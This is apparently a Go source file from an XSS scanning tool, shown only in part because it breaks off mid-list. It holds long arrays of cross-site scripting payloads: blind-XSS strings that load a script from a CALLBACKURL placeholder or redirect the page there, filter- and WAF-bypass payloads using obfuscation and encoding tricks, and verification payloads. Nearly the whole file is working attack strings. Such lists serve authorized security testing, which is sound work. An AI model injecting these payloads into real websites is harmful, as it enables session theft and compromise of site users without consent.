package payload

import (
	"bufio"
	"strings"
)

// GetCommonPayloadWithSize is exported interface
func GetCommonPayloadWithSize() ([]string, int) {
	lst := GetCommonPayload()
	return lst, len(lst)
}

// GetHTMLPayloadWithSize is exported interface
func GetHTMLPayloadWithSize() ([]string, int) {
	lst := GetHTMLPayload("")
	return lst, len(lst)
}

// GetAttrPayloadWithSize is exported interface
func GetAttrPayloadWithSize() ([]string, int) {
	lst := GetAttrPayload("")
	return lst, len(lst)
}

// GetInJsPayloadWithSize is exported interface
func GetInJsPayloadWithSize() ([]string, int) {
	lst := GetInJsPayload("")
	return lst, len(lst)
}

// GetInJsBreakScriptPayloadWithSize is exported interface
func GetInJsBreakScriptPayloadWithSize() ([]string, int) {
	lst := GetInJsBreakScriptPayload("")
	return lst, len(lst)
}

func splitLines(s string) []string {
	var lines []string
	sc := bufio.NewScanner(strings.NewReader(s))
	for sc.Scan() {
		lines = append(lines, sc.Text())
	}
	return lines
}

// GetBlindPayload is return Blind XSS Payload
func GetBlindPayload() []string {
	payload := []string{
		"\"'><script src=CALLBACKURL></script>",
		"<IMG SRC=x onload=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onafterprint=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onbeforeprint=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onbeforeunload=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onerror=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onhashchange=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onmessage=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x ononline=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onoffline=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onpagehide=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onpageshow=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onpopstate=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onresize=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onstorage=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onunload=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onblur=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onchange=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x oncontextmenu=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x oninput=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x oninvalid=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onreset=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onsearch=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onselect=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onsubmit=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onkeydown=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onkeypress=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onkeyup=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onclick=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x ondblclick=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onmousedown=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onmousemove=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onmouseout=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onmouseover=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onmouseup=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onmousewheel=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onwheel=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x ondrag=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x ondragend=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x ondragenter=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x ondragleave=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x ondragover=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x ondragstart=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x ondrop=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onscroll=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x oncopy=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x oncut=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onpaste=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onabort=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x oncanplay=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x oncanplaythrough=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x oncuechange=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x ondurationchange=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onemptied=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onended=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onloadeddata=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onloadedmetadata=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onloadstart=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onpause=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onplay=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onplaying=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onprogress=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onratechange=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onseeked=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onseeking=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onstalled=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onsuspend=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x ontimeupdate=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onvolumechange=\"alert(String.fromCharCode(88,83,83))\">",
		"<IMG SRC=x onwaiting=\"alert(String.fromCharCode(88,83,83))\">",
		"\"'><script src=https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js></script><div ng-app ng-csp><textarea autofocus ng-focus=\"d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='CALLBACKURL'\"></textarea></div>",
		"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+document.location=`CALLBACKURL`//'>",
		"\"'><svg onload=\"javascript:eval('d=document; _ = d.createElement(\\'script\\');_.src=\\'CALLBACKURL\\'%3Bd.body.appendChild(_)')\" xmlns=\"http://www.w3.org/2000/svg\"></svg>",
	}
	return payload
}

// GetWAFBypassPayloads returns WAF bypass payloads for various WAF systems
func GetWAFBypassPayloads() []string {
	return []string{
		// SVG-based bypasses
		"<svg onload=alert(1)>",
		"<svg/onload=alert(1)>",
		"<svg onload=alert`1`>",
		"<svg onload=alert&lpar;1&rpar;>",

		// IMG-based bypasses
		"<img src=x onerror=alert(1)>",
		"<img/src=x/onerror=alert(1)>",
		"<img src=x onerror=alert`1`>",
		"<img src=x onerror=alert&lpar;1&rpar;>",

		// SCRIPT-based bypasses
		"<script>alert(1)</script>",
		"<script>alert`1`</script>",
		"<script>alert&lpar;1&rpar;</script>",
		"<script src=data:,alert(1)></script>",

		// IFRAME-based bypasses
		"<iframe src=javascript:alert(1)></iframe>",
		"<iframe/src=javascript:alert(1)></iframe>",
		"<iframe src=data:text/html,<script>alert(1)</script>></iframe>",

		// OBJECT-based bypasses
		"<object data=javascript:alert(1)></object>",
		"<object/data=javascript:alert(1)></object>",
		"<object data=data:text/html,<script>alert(1)</script>></object>",
		"<object data=# codebase=javascript:alert(1)//>",

		// EMBED-based bypasses
		"<embed src=javascript:alert(1)></embed>",
		"<embed/src=javascript:alert(1)></embed>",
		"<embed src=data:text/html,<script>alert(1)</script>></embed>",
		"<embed src=# codebase=javascript:alert(1)//>",

		// MARQUEE-based bypasses
		"<marquee onstart=alert(1)></marquee>",
		"<marquee/onstart=alert(1)></marquee>",
		"<marquee onstart=alert`1`></marquee>",

		// DETAILS-based bypasses
		"<details open ontoggle=alert(1)></details>",

		// CSP Bypass with nonce
		"<script nonce='random'>alert(1)</script>",
		"<script nonce=\"random\">alert(1)</script>",

		// Modern HTML5 elements
		"<dialog open oncancel=alert(1)></dialog>",
		"<slot onfocus=alert(1) tabindex=1></slot>",
		"<template id=x></template><script>document.getElementById('x').content.appendChild(document.createElement('img')).onerror=alert(1)</script>",

		// Web Components
		"<custom-element onconnectedcallback=alert(1)></custom-element>",
		"<shadow-root mode=open><script>alert(1)</script></shadow-root>",

		// Modern event handlers
		"<div onpointerrawupdate=alert(1)></div>",
		"<div onbeforexrselect=alert(1)></div>",
		"<div onwebkitanimationend=alert(1)></div>",
		"<div onwebkittransitionend=alert(1)></div>",

		// CSS injection with expression
		"<style>@import 'data:text/css,body{background:url(javascript:alert(1))}'</style>",
		"<link rel=stylesheet href=data:text/css,body{background:url(javascript:alert(1))}>",

		// Service Worker bypass
		"<script>navigator.serviceWorker.register('data:application/javascript,self.addEventListener(\"message\",e=>eval(e.data))')</script>",

		// WebAssembly bypass
		"<script>WebAssembly.instantiate(new Uint8Array([0,97,115,109,1,0,0,0,1,4,1,96,0,0,3,2,1,0,7,9,1,5,97,108,101,114,116,0,0,10,6,1,4,0,65,1,16,0,11])).then(m=>m.instance.exports.alert())</script>",

		// Modern encoding bypasses
		"<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>",
		"<img src=x onerror=\x61\x6c\x65\x72\x74(1)>",
		"<img src=x onerror=eval('\\141\\154\\145\\162\\164(1)')>",

		// Trusted Types bypass
		"<script>trustedTypes.createPolicy('default',{createHTML:s=>s,createScript:s=>s}).createHTML('<img src=x onerror=alert(1)>')</script>",

		// Modern DOM manipulation
		"<script>document.createElement('img').onerror=alert(1);document.images[0].src='x'</script>",
		"<script>new Image().onerror=alert(1);document.images[0].src='x'</script>",

		// Fetch API bypass
		"<script>fetch('data:text/html,<script>alert(1)</script>').then(r=>r.text()).then(eval)</script>",

		// Modern attribute bypasses
		"<iframe srcdoc='<script>parent.alert(1)</script>'></iframe>",
		"<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></iframe>",

		// CSS custom properties
		"<style>:root{--xss:url(javascript:alert(1))}body{background:var(--xss)}</style>",

		// Modern form bypasses
		"<form><button formaction=javascript:alert(1)>XSS</button></form>",
		"<form><input type=submit formaction=javascript:alert(1) value=XSS></form>",

		// Intersection Observer bypass
		"<script>new IntersectionObserver(alert).observe(document.body)</script>",

		// Mutation Observer bypass
		"<script>new MutationObserver(alert).observe(document,{childList:1})</script>",

		// Performance Observer bypass
		"<script>new PerformanceObserver(alert).observe({entryTypes:['navigation']})</script>",

		// Resize Observer bypass
		"<script>new ResizeObserver(alert).observe(document.body)</script>",

		// Modern media bypasses
		"<video><source onerror=alert(1) src=x></video>",
		"<audio><source onerror=alert(1) src=x></audio>",
		"<picture><source onerror=alert(1) src=x></picture>",

		// Canvas bypass
		"<canvas id=x></canvas><script>document.getElementById('x').getContext('2d').canvas.toBlob(alert)</script>",

		// WebGL bypass
		"<script>document.createElement('canvas').getContext('webgl').getExtension('WEBGL_debug_renderer_info')||alert(1)</script>",

		// Clipboard API bypass
		"<script>navigator.clipboard.writeText('XSS').then(alert)</script>",

		// Geolocation bypass
		"<script>navigator.geolocation.getCurrentPosition(alert,alert)</script>",

		// Battery API bypass
		"<script>navigator.getBattery().then(alert)</script>",

		// Gamepad API bypass
		"<script>window.addEventListener('gamepadconnected',alert)</script>",

		// Payment Request bypass
		"<script>new PaymentRequest([{supportedMethods:'basic-card'}],{total:{label:'',amount:{currency:'USD',value:'0'}}}).show().catch(alert)</script>",

		// Credential Management bypass
		"<script>navigator.credentials.create({password:{id:'x',password:'x'}}).then(alert,alert)</script>",

		// Push API bypass
		"<script>navigator.serviceWorker.ready.then(r=>r.pushManager.subscribe()).then(alert,alert)</script>",

		// Background Sync bypass
		"<script>navigator.serviceWorker.ready.then(r=>r.sync.register('xss')).then(alert,alert)</script>",

		// Web Share bypass
		"<script>navigator.share({title:'XSS'}).then(alert,alert)</script>",

		// Screen Capture bypass
		"<script>navigator.mediaDevices.getDisplayMedia().then(alert,alert)</script>",

		// Web Locks bypass
		"<script>navigator.locks.request('xss',alert)</script>",

		// Broadcast Channel bypass
		"<script>new BroadcastChannel('xss').postMessage(1);new BroadcastChannel('xss').onmessage=alert</script>",

		// Shared Worker bypass
		"<script>new SharedWorker('data:application/javascript,onconnect=e=>e.ports[0].postMessage(1)').port.onmessage=alert</script>",

		// Dedicated Worker bypass
		"<script>new Worker('data:application/javascript,postMessage(1)').onmessage=alert</script>",

		// MessageChannel bypass
		"<script>new MessageChannel().port1.onmessage=alert;new MessageChannel().port2.postMessage(1)</script>",

		// AbortController bypass
		"<script>new AbortController().signal.addEventListener('abort',alert);new AbortController().abort()</script>",

		// ReadableStream bypass
		"<script>new ReadableStream({start:alert})</script>",

		// WritableStream bypass
		"<script>new WritableStream({start:alert})</script>",

		// TransformStream bypass
		"<script>new TransformStream({start:alert})</script>",

		// CompressionStream bypass
		"<script>new CompressionStream('gzip').readable.getReader().read().then(alert,alert)</script>",

		// DecompressionStream bypass
		"<script>new DecompressionStream('gzip').readable.getReader().read().then(alert,alert)</script>",

		// TextEncoder bypass
		"<script>new TextEncoder().encode('').constructor.constructor('alert(1)')()</script>",

		// TextDecoder bypass
		"<script>new TextDecoder().decode(new Uint8Array()).constructor.constructor('alert(1)')()</script>",

		// URL Pattern bypass
		"<script>new URLPattern({pathname:'*'}).test('javascript:alert(1)')||alert(1)</script>",

		// Temporal API bypass (if available)
		"<script>Temporal?.Now?.instant()?.toString()?.constructor?.constructor('alert(1)')()</script>",

		// Import Maps bypass
		"<script type=importmap>{\"imports\":{\"xss\":\"data:text/javascript,alert(1)\"}}</script><script type=module>import 'xss'</script>",

		// Top Level Await bypass
		"<script type=module>await import('data:text/javascript,alert(1)')</script>",

		// Dynamic Import bypass
		"<script>import('data:text/javascript,alert(1)')</script>",

		// Private Fields bypass
		"<script>class X{#x=alert(1)}</script>",

		// Optional Chaining bypass
		"<script>window?.alert?.(1)</script>",

		// Nullish Coalescing bypass
		"<script>(null??alert)(1)</script>",

		// BigInt bypass
		"<script>BigInt?.prototype?.constructor?.constructor('alert(1)')()</script>",

		// WeakRef bypass
		"<script>new WeakRef(alert).deref()(1)</script>",

		// FinalizationRegistry bypass
		"<script>new FinalizationRegistry(alert).register({},1)</script>",

		// Logical Assignment bypass
		"<script>window.x??=alert;x(1)</script>",

		// Numeric Separators bypass
		"<script>eval('1_000_000'.replace(/_/g,''))||alert(1)</script>",

		// String replaceAll bypass
		"<script>'alert(1)'.replaceAll('','').constructor.constructor('alert(1)')()</script>",

		// Promise.any bypass
		"<script>Promise.any([Promise.reject(),Promise.resolve(alert(1))])</script>",

		// AggregateError bypass
		"<script>new AggregateError([],alert(1))</script>",

		// Array.at bypass
		"<script>[alert].at(0)(1)</script>",

		// Object.hasOwn bypass
		"<script>Object.hasOwn(window,'alert')&&alert(1)</script>",

		// Error.cause bypass
		"<script>new Error('',{cause:alert(1)})</script>",

		// Intl.Segmenter bypass
		"<script>new Intl.Segmenter().segment('').constructor.constructor('alert(1)')()</script>",

		// Intl.ListFormat bypass
		"<script>new Intl.ListFormat().format([]).constructor.constructor('alert(1)')()</script>",

		// Intl.RelativeTimeFormat bypass
		"<script>new Intl.RelativeTimeFormat().format(1,'day').constructor.constructor('alert(1)')()</script>",

		// Intl.Locale bypass
		"<script>new Intl.Locale('en').toString().constructor.constructor('alert(1)')()</script>",

		// Intl.DisplayNames bypass
		"<script>new Intl.DisplayNames(['en'],{type:'region'}).of('US').constructor.constructor('alert(1)')()</script>",

		// Intl.DateTimeFormat bypass
		"<script>new Intl.DateTimeFormat().format().constructor.constructor('alert(1)')()</script>",

		// Intl.NumberFormat bypass
		"<script>new Intl.NumberFormat().format(1).constructor.constructor('alert(1)')()</script>",

		// Intl.PluralRules bypass
		"<script>new Intl.PluralRules().select(1).constructor.constructor('alert(1)')()</script>",

		// Intl.Collator bypass
		"<script>new Intl.Collator().compare('a','b').constructor.constructor('alert(1)')()</script>",
		"<details/open/ontoggle=alert(1)></details>",
		"<details open ontoggle=alert`1`></details>",

		// VIDEO-based bypasses
		"<video onloadstart=alert(1)></video>",
		"<video/onloadstart=alert(1)></video>",
		"<video onloadstart=alert`1`></video>",

		// AUDIO-based bypasses
		"<audio onloadstart=alert(1)></audio>",
		"<audio/onloadstart=alert(1)></audio>",
		"<audio onloadstart=alert`1`></audio>",

		// INPUT-based bypasses
		"<input onfocus=alert(1) autofocus>",
		"<input/onfocus=alert(1)/autofocus>",
		"<input onfocus=alert`1` autofocus>",

		// SELECT-based bypasses
		"<select onfocus=alert(1) autofocus></select>",
		"<select/onfocus=alert(1)/autofocus></select>",
		"<select onfocus=alert`1` autofocus></select>",

		// TEXTAREA-based bypasses
		"<textarea onfocus=alert(1) autofocus></textarea>",
		"<textarea/onfocus=alert(1)/autofocus></textarea>",
		"<textarea onfocus=alert`1` autofocus></textarea>",

		// KEYGEN-based bypasses
		"<keygen onfocus=alert(1) autofocus>",
		"<keygen/onfocus=alert(1)/autofocus>",
		"<keygen onfocus=alert`1` autofocus>",

		// BUTTON-based bypasses
		"<button onfocus=alert(1) autofocus></button>",
		"<button/onfocus=alert(1)/autofocus></button>",
		"<button onfocus=alert`1` autofocus></button>",

		// FORM-based bypasses
		"<form><button formaction=javascript:alert(1)>Click</button></form>",
		"<form><input type=submit formaction=javascript:alert(1) value=Click></form>",

		// MATH-based bypasses
		"<math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><path id=\"</textarea><img onerror=alert(1) src=x>\"></path></svg></mglyph></mtext></math>",

		// SVG animate/set/foreignObject/use bypasses
		"<svg><animate onbegin=alert(1) attributeName=x></animate></svg>",
		"<svg><set onbegin=alert(1) attributeName=x></set></svg>",
		"<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>",
		"<svg><use href=\"data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'></svg>\"></use></svg>",
	}
}

// GetCommonPayload is return xss
func GetCommonPayload() []string {
	payload := []string{
		// include verify payload
		"\"><SvG/onload=alert(DALFOX_ALERT_VALUE) id=dalfox>",
		"\"><Svg/onload=alert(DALFOX_ALERT_VALUE) class=dlafox>",
		"'><sVg/onload=alert(DALFOX_ALERT_VALUE) id=dalfox>",
		"'><sVg/onload=alert(DALFOX_ALERT_VALUE) class=dalfox>",
		"</ScriPt><sCripT id=dalfox>alert(DALFOX_ALERT_VALUE)</sCriPt>",
		"</ScriPt><sCripT class=dalfox>alert(DALFOX_ALERT_VALUE)</sCriPt>",
		"\"><a href=javas&#99;ript:alert(DALFOX_ALERT_VALUE)/class=dalfox>click",
		"'><a href=javas&#99;ript:alert(DALFOX_ALERT_VALUE)/class=dalfox>click",
		"'><svg/class='dalfox'onLoad=alert(DALFOX_ALERT_VALUE)>",
		"\"><d3\"<\"/onclick=\" class=dalfox>[confirm``]\"<\">z",
		"\"><w=\"/x=\"y>\"/class=dalfox/ondblclick=`<`[confir\u006d``]>z",
		"\"><iFrAme/src=jaVascRipt:alert(DALFOX_ALERT_VALUE) class=dalfox></iFramE>",
		"\"><svg/class=\"dalfox\"onLoad=alert(DALFOX_ALERT_VALUE)>",
		"\"><svg/OnLoad=\"`${prompt``}`\" class=dalfox>",
		"'\"><img/src/onerror=.1|alert`` class=dalfox>",
		"\"><img/src/onerror=.1|alert`` class=dalfox>",
		"'><img/src/onerror=.1|alert`` class=dalfox>",

		//  Modern XSS Payloads
		"\"><IMG SRC=x onafterprint=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
		"\"><IMG SRC=x onbeforeprint=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
		"\"><IMG SRC=x onbeforeunload=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
		"\"><IMG SRC=x onhashchange=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
		"\"><IMG SRC=x onmessage=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
		"\"><IMG SRC=x ononline=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
		"\"><IMG SRC=x onoffline=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
		"\"><IMG SRC=x onpagehide=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
		"\"><IMG SRC=x onpageshow=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
		"\"><IMG SRC=x onpopstate=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
		"\"><IMG SRC=x onstorage=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
		"\"><IMG SRC=x oncontextmenu=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
		"\"><IMG SRC=x oninvalid=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
		"\"><IMG SRC=x onsearch=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
		"\"><IMG SRC=x onwheel=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
		"\"><IMG SRC=x ondragend=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
		"\"><IMG SRC=x ondragenter=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
		"\"><IMG SRC=x ondragleave=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
		"\"><IMG SRC=x ondragover=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
		"\"><IMG SRC=x ondragstart=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",

		// WAF Bypass Payloads (Issue #750)
		"><svg/onload=alert(DALFOX_ALERT_VALUE)//>",
		"'><svg/onload=alert(DALFOX_ALERT_VALUE)//>",
		"><img src=x onerror=alert(DALFOX_ALERT_VALUE)//>",
		"'><img src=x onerror=alert(DALFOX_ALERT_VALUE)//>",
		"><script>alert(DALFOX_ALERT_VALUE)</script>",
		"'><script>alert(DALFOX_ALERT_VALUE)</script>",
		"><iframe src=javascript:alert(DALFOX_ALERT_VALUE)></iframe>",
		"'><iframe src=javascript:alert(DALFOX_ALERT_VALUE)></iframe>",
		"><object data=javascript:alert(DALFOX_ALERT_VALUE)></object>",
		"'><object data=javascript:alert(DALFOX_ALERT_VALUE)></object>",
		"><object data=# codebase=javascript:alert(DALFOX_ALERT_VALUE)></object>",
		"'><object data=# codebase=javascript:alert(DALFOX_ALERT_VALUE)></object>",
		"><embed src=javascript:alert(DALFOX_ALERT_VALUE)></embed>",
		"'><embed src=javascript:alert(DALFOX_ALERT_VALUE)></embed>",
		"><embed src=# codebase=javascript:alert(DALFOX_ALERT_VALUE)></embed>",
		"'><embed src=# codebase=javascript:alert(DALFOX_ALERT_VALUE)></embed>",
		"><marquee onstart=alert(DALFOX_ALERT_VALUE)></marquee>",
		"'><marquee onstart=alert(DALFOX_ALERT_VALUE)></marquee>",
		"><details open ontoggle=alert(DALFOX_ALERT_VALUE)></details>",
		"'><details open ontoggle=alert(DALFOX_ALERT_VALUE)></details>",
		"><video><source onerror=alert(DALFOX_ALERT_VALUE)></video>",
		"'><video><source onerror=alert(DALFOX_ALERT_VALUE)></video>",
		"><audio><source onerror=alert(DALFOX_ALERT_VALUE)></audio>",
		"'><audio><source onerror=alert(DALFOX_ALERT_VALUE)></audio>",
		"><input onfocus=alert(DALFOX_ALERT_VALUE) autofocus>",
		"'><input onfocus=alert(DALFOX_ALERT_VALUE) autofocus>",
		"><select onfocus=alert(DALFOX_ALERT_VALUE) autofocus><option>test</option></select>",
		"'><select onfocus=alert(DALFOX_ALERT_VALUE) autofocus><option>test</option></select>",
		"><textarea onfocus=alert(DALFOX_ALERT_VALUE) autofocus></textarea>",
		"'><textarea onfocus=alert(DALFOX_ALERT_VALUE) autofocus></textarea>",
		"><keygen onfocus=alert(DALFOX_ALERT_VALUE) autofocus>",
		"'><keygen onfocus=alert(DALFOX_ALERT_VALUE) autofocus>",
		"><button onfocus=alert(DALFOX_ALERT_VALUE) autofocus>test</button>",
		"'><button onfocus=alert(DALFOX_ALERT_VALUE) autofocus>test</button>",
		"><form><button formaction=javascript:alert(DALFOX_ALERT_VALUE)>test</button></form>",
		"'><form><button formaction=javascript:alert(DALFOX_ALERT_VALUE)>test</button></form>",
		"><math><mi//xlink:href=data:x,<script>alert(DALFOX_ALERT_VALUE)</script>>",
		"'><math><mi//xlink:href=data:x,<script>alert(DALFOX_ALERT_VALUE)</script>>",
		"><svg><animate onbegin=alert(DALFOX_ALERT_VALUE) attributeName=x dur=1s>",
		"'><svg><animate onbegin=alert(DALFOX_ALERT_VALUE) attributeName=x dur=1s>",
		"><svg><animateTransform onbegin=alert(DALFOX_ALERT_VALUE) attributeName=transform>",
		"'><svg><animateTransform onbegin=alert(DALFOX_ALERT_VALUE) attributeName=transform>",
		"><svg><animateMotion onbegin=alert(DALFOX_ALERT_VALUE) path=M20,20L20,50>",
		"'><svg><animateMotion onbegin=alert(DALFOX_ALERT_VALUE) path=M20,20L20,50>",
		"><svg><set onbegin=alert(DALFOX_ALERT_VALUE) attributeName=x to=0>",
		"'><svg><set onbegin=alert(DALFOX_ALERT_VALUE) attributeName=x to=0>",
		"><svg><foreignObject><img src=x onerror=alert(DALFOX_ALERT_VALUE)></foreignObject>",
		"'><svg><foreignObject><img src=x onerror=alert(DALFOX_ALERT_VALUE)></foreignObject>",
		"><svg><use href=data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg' onload='alert(DALFOX_ALERT_VALUE)'></svg>#x>",
		"'><svg><use href=data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg' onload='alert(DALFOX_ALERT_VALUE)'></svg>#x>",
		"\"><IMG SRC=x ondrop=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
		"\"><IMG SRC=x oncopy=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
		"\"><IMG SRC=x oncut=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
		"\"><IMG SRC=x onpaste=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
		"\"><IMG SRC=x oncanplay=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
		"\"><IMG SRC=x oncanplaythrough=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
		"\"><IMG SRC=x oncuechange=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
		"\"><IMG SRC=x ondurationchange=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
		"\"><IMG SRC=x onemptied=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
		"\"><IMG SRC=x onended=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
		"\"><IMG SRC=x onloadeddata=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
		"\"><IMG SRC=x onloadedmetadata=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
		"\"><IMG SRC=x onloadstart=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
		"\"><IMG SRC=x onpause=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
		"\"><IMG SRC=x onplay=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
		"\"><IMG SRC=x onplaying=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
		"\"><IMG SRC=x onprogress=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
		"\"><IMG SRC=x onratechange=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
		"\"><IMG SRC=x onseeked=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
		"\"><IMG SRC=x onseeking=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
		"\"><IMG SRC=x onstalled=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
		"\"><IMG SRC=x onsuspend=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
		"\"><IMG SRC=x ontimeupdate=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
		"\"><IMG SRC=x onvolumechange=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",
		"\"><IMG SRC=x onwaiting=\"alert(String.fromCharCode(88,83,83))\" class=dalfox>",

		// Modern Bypass Techniques
		"\"><svg/onload=\"eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))\" class=dalfox>", // Base64 encoded alert
		"\"><img src=x onerror=\"Function('ale'+'rt(DALFOX_ALERT_VALUE)')()\" class=dalfox>",
		"\"><svg onload=\"[].constructor.constructor('alert(DALFOX_ALERT_VALUE)')()\" class=dalfox>",
		"\"><img src=x onerror=\"setTimeout('alert(DALFOX_ALERT_VALUE)',1)\" class=dalfox>",
		"\"><svg onload=\"setInterval('alert(DALFOX_ALERT_VALUE)',1000)\" class=dalfox>",
		"\"><img src=x onerror=\"requestAnimationFrame(()=>alert(DALFOX_ALERT_VALUE))\" class=dalfox>",
		"\"><svg onload=\"queueMicrotask(()=>alert(DALFOX_ALERT_VALUE))\" class=dalfox>",
